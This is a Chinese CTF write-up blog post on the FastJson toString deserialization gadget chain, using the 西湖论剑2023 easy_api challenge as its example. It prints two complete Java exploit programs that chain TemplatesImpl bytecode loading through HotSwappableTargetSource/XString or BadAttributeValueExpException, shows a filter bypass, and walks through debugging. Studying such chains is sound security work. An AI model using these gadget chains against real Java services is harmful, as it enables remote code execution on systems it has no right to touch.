+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h2 id="不调试的原因"><a href="#不调试的原因" class="headerlink" title="不调试的原因"></a>不调试的原因</h2><p>就是你跟着文章看完了你也就大概懂了一半了，加入单纯为了学习就看看就好了</p>
+<h1 id="FastJson-toString链"><a href="#FastJson-toString链" class="headerlink" title="FastJson toString链"></a>FastJson toString链</h1><h2 id="西湖论剑2023-easy-api"><a href="#西湖论剑2023-easy-api" class="headerlink" title="西湖论剑2023[easy_api]"></a>西湖论剑2023[easy_api]</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>根据这道题来学习一下这条链，首先可以看一下这一题的主要路由<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677295450910-f5b018cb-6a6d-40df-a024-265483376823.png#averageHue=%23292a26&clientId=u7d14138f-7a5c-4&from=paste&height=445&id=u0305a62b&name=image.png&originHeight=556&originWidth=1669&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1338858&status=done&style=none&taskId=u2d51331d-8e58-4546-af76-ebd10d883db&title=&width=1335.2" alt="image.png"><br>在这直接进行了一个反序列化，参数可控，但首先有几层bypass：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677295480581-b263f6e5-fec8-4eda-97de-e9b0ce5e16d7.png#averageHue=%23282a26&clientId=u7d14138f-7a5c-4&from=paste&height=525&id=u27dff5d0&name=image.png&originHeight=656&originWidth=1355&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1219809&status=done&style=none&taskId=uac7a134e-dd27-4788-b74b-7b77177c676&title=&width=1084" alt="image.png"><br>先要绕过这两filter，用<code>//api/test</code>去绕过就可以，重点不在这，题目用的是<code>CustomObjectInputStream</code>进行的反序列化，可以看看逻辑：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677295531645-c3b6f090-e1d5-466e-a637-e2f09af67215.png#averageHue=%23252724&clientId=u7d14138f-7a5c-4&from=paste&height=558&id=u921c9c5c&name=image.png&originHeight=697&originWidth=1379&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1300979&status=done&style=none&taskId=ue04dcbea-8c71-4bd7-9c1a-60652d802a4&title=&width=1103.2" alt="image.png"><br>做了一层过滤，不允许我们使用<code>java.lang.reflect.Proxy&quot;, &quot;javax.management.BadAttributeValueExpException&quot;, &quot;sun.rmi.server.UnicastRef&quot;, &quot;sun.rmi.transport.LiveRef&quot;, &quot;sun.rmi.transport.tcp.TCPEndpoint&quot;, &quot;java.rmi.server.RemoteObject&quot;, &quot;java.rmi.server.RemoteRef&quot;, &quot;java.rmi.server.ObjID&quot;, &quot;java.rmi.RemoteObjectInvocationHandler&quot;, &quot;java.rmi.server.UnicastRemoteObject&quot;, &quot;java.rmi.registry.Registry</code><br>这几个类，可以看到BadAttributeValueExpException被ban了，今天要讲的是触发fastjson的tostring，BadAttributeValueExpException是可以触发的，因此需要寻找替代品</p>
+<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p>就不多BB了，在上面的CVE中用到了使用xstring的方法去触发toString，我们直接拿poc来调试分析一下即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fj_gadget</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\CTF\\Security_Learning\\ROME\\target\\classes\\shell.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"> </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jo.put(<span class="string">&quot;1&quot;</span>,templatesimpl);</span><br><span class="line"> </span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jo);</span><br><span class="line"><span class="comment">//        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(&quot;xxx&quot;));</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line"> </span><br><span class="line">        Class clazz=h2.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerdeclaredField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">        transformerdeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerdeclaredField.set(h2,<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line"> </span><br><span class="line">        System.out.println(serial(hashMap));</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;...&quot;</span>;</span><br><span class="line">        <span class="comment">//        deserial(payload);</span></span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">CustomObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="调试流程"><a href="#调试流程" class="headerlink" title="调试流程"></a>调试流程</h3><p>这里就本地直接起一个SpringBoot将主要路由逻辑拿过来就好了，就不加Filter，先引入依赖：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.48<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677296428860-536b4f6b-e461-404d-a45a-ea826d5e058a.png#averageHue=%232a2c29&clientId=u4b384332-f3fe-4&from=paste&height=567&id=ud6f8e2e7&name=image.png&originHeight=709&originWidth=1746&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1775558&status=done&style=none&taskId=u6f73b02b-9761-4633-b269-0722539d63e&title=&width=1396.8" alt="image.png"><br>在readObject处下断点分析：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677296852780-a097dfef-9274-4cad-b038-84d957fc9298.png#averageHue=%232b2c2a&clientId=u4b384332-f3fe-4&from=paste&height=338&id=u62e8d936&name=image.png&originHeight=423&originWidth=1880&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1105331&status=done&style=none&taskId=u3a5baf7d-4d18-47ec-b0f2-da6e1af099b&title=&width=1504" alt="image.png"><br>首先进入的HashMap的readObject方法，因为我们最外层就是hashmap：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307376957-8e0eb1d8-5728-430e-97e0-8eb411616e73.png#averageHue=%232d2e2a&clientId=u4b384332-f3fe-4&from=paste&height=158&id=u95d5024b&name=image.png&originHeight=198&originWidth=1454&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=414717&status=done&style=none&taskId=uebbfb2f8-2f6e-4bd5-9c2e-22500d4c964&title=&width=1163.2" alt="image.png"><br>然后就和URLDNS链一样到了putval函数：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307394369-41f2ca32-5e28-41a3-a3bf-7783a928aed6.png#averageHue=%232a2b28&clientId=u4b384332-f3fe-4&from=paste&height=84&id=ufceb67d2&name=image.png&originHeight=105&originWidth=1423&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=214004&status=done&style=none&taskId=u860f1734-f360-4d6e-a00d-f8650cc6ed9&title=&width=1138.4" alt="image.png"><br>在putval函数中调用了equals方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307437816-8c2e2806-3f64-4f09-83f0-b5034b4efde6.png#averageHue=%232b2d2b&clientId=u4b384332-f3fe-4&from=paste&height=707&id=u76b7841f&name=image.png&originHeight=884&originWidth=1422&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1727643&status=done&style=none&taskId=u38c0aa66-0888-46e3-912d-7713d136e1e&title=&width=1137.6" alt="image.png"><br>这里的key是一个<code>HotSwappableTargetSource</code>，这个类充当跳板作用，调用它的equals方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307489900-25bdce8c-efb7-44cd-a39c-64d2905538e4.png#averageHue=%23292b29&clientId=u4b384332-f3fe-4&from=paste&height=634&id=uba0a620a&name=image.png&originHeight=793&originWidth=1452&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1524844&status=done&style=none&taskId=ue3e4ba2b-f87e-42dc-8725-7a108ea13fd&title=&width=1161.6" alt="image.png"><br>在调用它的target属性的equals方法，这里我们反射修改target为xstring方法了，跟进：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307518484-61301c19-5fdf-4405-9060-28fef30ed778.png#averageHue=%232a2d2a&clientId=u4b384332-f3fe-4&from=paste&height=399&id=u4889587e&name=image.png&originHeight=499&originWidth=1424&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=918395&status=done&style=none&taskId=u92b77292-bd12-4b28-8514-0a0e67de01c&title=&width=1139.2" alt="image.png"><br>这里就调用了JsonObject的toString方法，这就是这篇文章的重点：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307606254-15e92aa3-1834-4184-88d7-5f03b6b281e9.png#averageHue=%2332332f&clientId=u4b384332-f3fe-4&from=paste&height=121&id=u6740aa2a&name=image.png&originHeight=151&originWidth=907&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=198842&status=done&style=none&taskId=u3635bb2a-394b-4ccb-803a-34ff3434833&title=&width=725.6" alt="image.png"><br>这里调用了<code>JsonObject#toJSONString</code>，到这儿就回到了第一P种的任意get和set触发了，这里会触发get方法，也就是TemplatesImpl的<code>getOutputProperties</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307855278-aa5a4f13-feae-46ca-8d84-a9da4f06f2e5.png#averageHue=%232c2d29&clientId=u4b384332-f3fe-4&from=paste&height=117&id=u1211e085&name=image.png&originHeight=146&originWidth=904&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=184762&status=done&style=none&taskId=uaee532fe-8a1f-421f-b3b3-8790dac8345&title=&width=723.2" alt="image.png"><br>调用newTransformer，接下来就是CC3的部分了，不再赘述</p>
+<h3 id="无Waf的解法"><a href="#无Waf的解法" class="headerlink" title="无Waf的解法"></a>无Waf的解法</h3><p>如果这一题没有重写ObjectInputStream，没有禁用的话，那么除了上述解法，也能用BadAttriubutexxxx中的toString<br>EXP：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson_tostring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\22927\\Downloads\\fastjson_tostring\\target\\classes\\com\\example\\fastjson_tostring\\evilclass.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jo.put(<span class="string">&quot;1&quot;</span>,templatesimpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jo);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">CustomObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简短的多了，传入之后成功弹出计算机：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677309807042-dc538917-8114-456e-9977-535f276746d8.png#averageHue=%239d9c9c&clientId=u4b384332-f3fe-4&from=paste&height=692&id=u566dc930&name=image.png&originHeight=865&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=236524&status=done&style=none&taskId=u6749b380-7362-425d-b965-91c911ae88b&title=&width=1536" alt="image.png"></p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/FastJson/" class="tag">#FastJson</a><a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/%E4%BB%8ERMI%E5%88%B0JNDI%E6%B3%A8%E5%85%A5/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">从RMI到JNDI注入</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">ThinkPHP5.x反序列化漏洞全复现</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
